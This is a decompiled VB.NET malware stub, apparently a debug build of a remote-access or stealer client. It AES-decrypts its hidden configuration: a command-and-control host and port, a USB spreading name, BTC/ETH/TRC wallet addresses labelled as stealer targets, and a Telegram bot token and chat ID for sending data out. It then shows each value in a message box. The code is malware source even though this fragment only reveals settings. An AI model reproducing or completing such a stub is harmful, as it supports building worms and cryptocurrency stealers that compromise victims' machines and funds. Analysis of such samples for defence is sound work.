Imports System
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace Stub
	' Token: 0x02000008 RID: 8
	Public Class Main
		' Token: 0x06000014 RID: 20
		<STAThread()>
		Public Shared Sub Main()
			MessageBox.Show("Sleep starting now", "Sleep", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			Thread.Sleep(Settings.Sleep * 1000)
			MessageBox.Show("Decryption starting now", "Decryption", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			Settings.Host = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(AlgorithmAES.Decrypt(Settings.Host)))))
			Settings.Port = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(AlgorithmAES.Decrypt(Settings.Port)))))
			Settings.KEY = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(AlgorithmAES.Decrypt(Settings.KEY)))))
			Settings.SPL = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(AlgorithmAES.Decrypt(Settings.SPL)))))
			Settings.USBNM = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(AlgorithmAES.Decrypt(Settings.USBNM)))))
			Settings.InstallDir = Environment.ExpandEnvironmentVariables(Settings.InstallDir)
			Settings.BTC = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(AlgorithmAES.Decrypt(Settings.BTC)))))
			Settings.ETH = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(AlgorithmAES.Decrypt(Settings.ETH)))))
			Settings.TRC = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(AlgorithmAES.Decrypt(Settings.TRC)))))
			Settings.Token = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(AlgorithmAES.Decrypt(Settings.Token)))))
			Settings.ChatID = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(AlgorithmAES.Decrypt(Settings.ChatID)))))
			MessageBox.Show(String.Format("Host: {0}", Settings.Host), "Host", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			MessageBox.Show(String.Format("Port: {0}", Settings.Port), "Port", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			MessageBox.Show(String.Format("Key: {0}", Settings.KEY), "Key", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			MessageBox.Show(String.Format("SPL: {0}", Settings.SPL), "SPL", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			MessageBox.Show(String.Format("USB: {0}", Settings.USBNM), "USB Spred Name", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			MessageBox.Show(String.Format("BTC: {0}", Settings.BTC), "BTC Steler", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			MessageBox.Show(String.Format("ETC: {0}", Settings.ETH), "ETH Steler", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			MessageBox.Show(String.Format("TRC: {0}", Settings.TRC), "TRC Steler", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			MessageBox.Show(String.Format("Token: {0}", Settings.Token), "Telegram Token", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			MessageBox.Show(String.Format("ChatID: {0}", Settings.ChatID), "Telegram Chat ID", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
		End Sub
	End Class
End Namespace
